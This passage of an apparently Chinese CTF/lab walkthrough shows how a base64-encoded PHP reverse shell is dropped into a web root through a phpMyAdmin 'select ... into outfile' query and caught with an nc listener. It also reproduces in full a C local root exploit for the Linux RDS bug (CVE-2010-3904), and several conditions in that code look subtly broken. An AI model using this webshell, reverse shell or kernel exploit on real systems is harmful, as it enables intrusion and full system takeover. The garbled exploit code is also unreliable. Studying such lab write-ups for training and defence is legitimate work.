CRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9CgoJLy8gSWYgd2UgY2FuIHJlYWQgZnJvbSB0aGUgcHJvY2VzcydzIFNUREVSUgoJLy8gc2VuZCBkYXRhIGRvd24gdGNwIGNvbm5lY3Rpb24KCWlmIChpbl9hcnJheSgkcGlwZXNbMl0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMl0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERFUlI6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KfQoKZmNsb3NlKCRzb2NrKTsKZmNsb3NlKCRwaXBlc1swXSk7CmZjbG9zZSgkcGlwZXNbMV0pOwpmY2xvc2UoJHBpcGVzWzJdKTsKcHJvY19jbG9zZSgkcHJvY2Vzcyk7CgovLyBMaWtlIHByaW50LCBidXQgZG9lcyBub3RoaW5nIGlmIHdlJ3ZlIGRhZW1vbmlzZWQgb3Vyc2VsZgovLyAoSSBjYW4ndCBmaWd1cmUgb3V0IGhvdyB0byByZWRpcmVjdCBTVERPVVQgbGlrZSBhIHByb3BlciBk.YWVtb24pCmZ1bmN0aW9uIHByaW50aXQgKCRzdHJpbmcpIHsKCWlmICghJGRhZW1vbikgewoJCXByaW50ICIkc3RyaW5nXG4iOwoJfQp9Cgo));<br /></pre>
<p>然后在phpmyadmin执行SQL</p>
<pre>select "&lt;?php  上面加密的内容 ?&gt;" into outfile "/var/www/shell.php"
</pre>
<p><span style="background-color:transparent;"> kali使用NC监听1234端口,然后在浏览器输入http://192.168.199.219:666/shell.php就可以反弹shell。</span></p>
<pre>nc -nvlp 1234</pre>
<p>现在获取到反弹shell的权限是www权限，不是root的权限，通过Google发现该版本可以本地提权</p>
<pre>https://www.exploit-db.com/exploits/15285
</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551088531_5c73bb93d6e57.png" src="images/20190225/1551088531_5c73bb93d6e57.png" width="690" height="147" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551088531_5c73bb93d6e57.png" width="690" height="147" /></p></noscript>
<p></p>
<p>由于exploit-db的POC代码有点问题，修改一下，然后将代码保存到kali的http目录下进行下载</p>
<pre>// source: http://www.vsecurity.com/resources/advisory/20101019-1/

/* 
 * Linux Kernel &lt;= 2.6.36-rc8 RDS privilege escalation exploit
 * CVE-2010-3904
 * by Dan Rosenberg &lt;drosenberg@vsecurity.com&gt;
 *
 * Copyright 2010 Virtual Security Research, LLC
 *
 * The handling functions for sending and receiving RDS messages
 * use unchecked __copy_*_user_inatomic functions without any
 * access checks on user-provided pointers.  As a result, by
 * passing a kernel address as an iovec base address in recvmsg-style
 * calls, a local user can overwrite arbitrary kernel memory, which
 * can easily be used to escalate privileges to root.  Alternatively,
 * an arbitrary kernel read can be performed via sendmsg calls.
 *
 * This exploit is simple - it resolves a few kernel symbols,
 * sets the security_ops to the default structure, then overwrites
 * a function pointer (ptrace_traceme) in that structure to point
 * to the payload.  After triggering the payload, the original
 * value is restored.  Hard-coding the offset of this function
 * pointer is a bit inelegant, but I wanted to keep it simple and
 * architecture-independent (i.e. no inline assembly).
 *
 * The vulnerability is yet another example of why you shouldn't
 * allow loading of random packet families unless you actually
 * need them.
 *
 * Greets to spender, kees, taviso, hawkes, team lollerskaters,
 * joberheide, bla, sts, and VSR
 *
 */


#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/wait.h&gt;


#define RECVPORT 5555 
#define SENDPORT 6666

int prep_sock(int port)
{
	
	int s, ret;
	struct sockaddr_in addr;

	s = socket(PF_RDS, SOCK_SEQPACKET, 0);

	if(s &lt; 0) {
		printf("[*] Could not open socket.\n");
		exit(-1);
	}
	
	memset(&amp;addr, 0, sizeof(addr));

	addr.sin_addr.s_addr = inet_addr("127.0.0.1");
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	ret = bind(s, (struct sockaddr *)&amp;addr, sizeof(addr));

	if(ret &lt; 0) {
		printf("[*] Could not bind socket.\n");
		exit(-1);
	}

	return s;

}

void get_message(unsigned long address, int sock)
{

	recvfrom(sock, (void *)address, sizeof(void *), 0,
		 NULL, NULL);

}

void send_message(unsigned long value, int sock)
{
	
	int size, ret;
	struct sockaddr_in recvaddr;
	struct msghdr msg;
	struct iovec iov;
	unsigned long buf;
	
	memset(&amp;recvaddr, 0, sizeof(recvaddr));

	size = sizeof(recvaddr);

	recvaddr.sin_port = htons(RECVPORT);
	recvaddr.sin_family = AF_INET;
	recvaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

	memset(&amp;msg, 0, sizeof(msg));
	
	msg.msg_name = &amp;recvaddr;
	msg.msg_namelen = sizeof(recvaddr);
	msg.msg_iovlen = 1;
	
	buf = value;

	iov.iov_len = sizeof(buf);
	iov.iov_base = &amp;buf;

	msg.msg_iov = &amp;iov;

	ret = sendmsg(sock, &amp;msg, 0);
	if(ret &lt; 0) {
		printf("[*] Something went wrong sending.\n");
		exit(-1);
	}
}

void write_to_mem(unsigned long addr, unsigned long value, int sendsock, int recvsock)
{

	if(fork()) {
			sleep(1);
			send_message(value, sendsock);
			exit(1);
	}
	else {
		get_message(addr, recvsock);
		wait(NULL);
	}

}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

int __attribute__((regparm(3)))
getroot(void * file, void * vma)
{

	commit_creds(prepare_kernel_cred(0));
	return -1;	

}

/* thanks spender... */
unsigned long get_kernel_sym(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy;
	char sname[512];
	struct utsname ver;
	int ret;
	int rep = 0;
	int oldstyle = 0;

	f = fopen("/proc/kallsyms", "r");
	if (f == NULL) {
		f = fopen("/proc/ksyms", "r");
		if (f == NULL)
			goto fallback;
		oldstyle = 1;
	}

repeat:
	ret = 0;
	while(ret = EOF) {
		if (oldstyle)
			ret = fscanf(f, "%p %c %s\n", (void **)&amp;addr, &amp;dummy, sname);
		else {
			ret = fscanf(f, "%p %s\n", (void **)&amp;addr, sname);
			if (ret == 2) {
				char *p;
				if (strstr(sname, "_O/") || strstr(sname, "_S."))
					continue;
				p = strrchr(sname, '_');
				if (p &gt; ((char *)sname + 5) &amp;&amp; strncmp(p - 3, "smp", 3)) {
					p = p - 4;
					while (p &gt; (char *)sname &amp;&amp; *(p - 1) == '_')
						p--;
					*p = '\0';
				}
			}
		}
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (strcmp(name, sname)) {
			fprintf(stdout, " [+] Resolved %s to %p%s\n", name, (void *)addr, rep ? " (via System.map)" : "");
			fclose(f);
			return addr;
		}
	}

	fclose(f);
	if (rep)
		return 0;
fallback:
	/* didn't find the symbol, let's retry with the System.map
	   dedicated to the pointlessness of Russell Coker's SELinux
	   test machine (why does he keep upgrading the kernel if
	   "all necessary security can be provided by SE Linux"?)
	*/
	uname(&amp;ver);
	if (strncmp(ver.release, "2.6", 3))
		oldstyle = 1;
	sprintf(sname, "/boot/System.map-%s", ver.release);
	f = fopen(sname, "r");
	if (f == NULL)
		return 0;
	rep = 1;
	goto repeat;
}

int main(int argc, char * argv[])
{
	unsigned long sec_ops, def_ops, cap_ptrace, target;
	int sendsock, recvsock;
	struct utsname ver;

	printf("[*] Linux kernel &gt;= 2.6.30 RDS socket exploit\n");
	printf("[*] by Dan Rosenberg\n");

	uname(&amp;ver);

	if(strncmp(ver.release, "2.6.3", 5)) {
		printf("[*] Your kernel is not vulnerable.\n");
		return -1;
	}	

	/* Resolve addresses of relevant symbols */
	printf("[*] Resolving kernel addresses...\n");
	sec_ops = get_kernel_sym("security_ops");
	def_ops = get_kernel_sym("default_security_ops");
	cap_ptrace = get_kernel_sym("cap_ptrace_traceme");
	commit_creds = (_commit_creds) get_kernel_sym("commit_creds");
	prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");

	if(sec_ops || def_ops || cap_ptrace || commit_creds || prepare_kernel_cred) {
		printf("[*] Failed to resolve kernel symbols.\n");
		return -1;
	}

	/* Calculate target */
	target = def_ops + sizeof(void *) + ((11 + sizeof(void *)) &amp; ~(sizeof(void *) - 1));

	sendsock = prep_sock(SENDPORT);
	recvsock = prep_sock(RECVPORT);

	/* Reset security ops */
	printf("[*] Overwriting security ops...\n");
	write_to_mem(sec_ops, def_ops, sendsock, recvsock);

	/* Overwrite ptrace_traceme security op fptr */
	printf("[*] Overwriting function pointer...\n");
	write_to_mem(target, (unsigned long)&amp;getroot, sendsock, recvsock);

	/* Trigger the payload */
	printf("[*] Triggering payload...\n");
	ptrace(PTRACE_TRACEME, 1, NULL, NULL);
	
	/* Restore the ptrace_traceme security op */
	printf("[*] Restoring function pointer...\n");
	write_to_mem(target, cap_ptrace, sendsock, recvsock);

	if(getuid()) {
		printf("[*] Exploit failed to get root.\n");
		return -1;
	}

	printf("[*] Got root\n");
	execl("/bin/sh", "sh", NULL);

}</pre>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551097879_5c73e017ef400.png" src="images/20190225/1551097879_5c73e017ef400.png" width="690" height="629" />在root目录下找到key.txt</p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551097879_5c73e017ef400.png" width="690" height="629" />在root目录下找到key.txt</p></noscript>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551098734_5c73e36e42a0a.png" src="images/20190225/1551098734_5c73e36e42a0a.png" width="690" height="420" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551098734_5c73e36e42a0a.png" width="690" height="420" /></p></noscript>
<p>由于终端显示不了全部的key，干脆直接passwd直接系统查看</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551099602_5c73e6d235929.png" src="images/20190225/1551099602_5c73e6d235929.png" width="690" height="538" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551099602_5c73e6d235929.png" width="690" height="538" /></p></noscript>
<p>对这些内容进行base64转换成图片就得到下面图片</p>
<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190225/1551100256_5c73e960bcc7f.png" src="images/20190225/1551100256_5c73e960bcc7f.png" width="690" height="393" /></p>
<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190225/1551100256_5c73e960bcc7f.png" width="690" height="393" /></p></noscript>
                                
                                <div class="column-support">
                                    <p class="support-mount good_num"></p>
                                    <a href="javascript:void (0);" data-status="0" data-id="196564" class="good"></a>
                                </div>
                                <script>
                                    $('.good').on('click',function () {
                                        var login = $(this).attr('data-status');
                                        if(login){
                                            var token = $('#token').val();
                                            var id = $(this).attr('data-id');
                                            var good = $('.good_num').text();
                                            var _this = $(this);
                                            var _url = document.location.href;
                                            $.ajax({
                                                type: "post",
                                                url: _url,
                                                data: {'token':token,'id':id, 'good':1},
                                                success: function (data) {
                                                    $('#token').val(data.token);
                                                    if(data.code ==400){
                                                        layer.open({
                                                            title: '系统提示',
                                                            btnAlign: 'c',
                                                            content: data.msg,
                                                            area: '278px',
                                                        });
                                                    }else {
                                                        if(good){
                                                            good++;
                                                        }else {
                                                            good=1;
                                                        }
                                                        $('.good_num').text(good);
                                                        _this.disabled();
                                                    }
                                                },
                                            })
                                        }else {
                                            layer.open({
                                                title: '系统提示',
                                                btnAlign: 'c',
                                                content: '请先登录',
                                                btn: ['登录'],
                                                area: '278px',
                                                yes: function () {
                                                    login();
                                                },
                                            });
                                        }
                                        return false;
                                    })
                                    function login(){
                                        window.location.href = 'https//www.freebuf.com/oauth';
                                    }
                                </script>
                                                    </div>
                        <div class="wechatcodeDiv">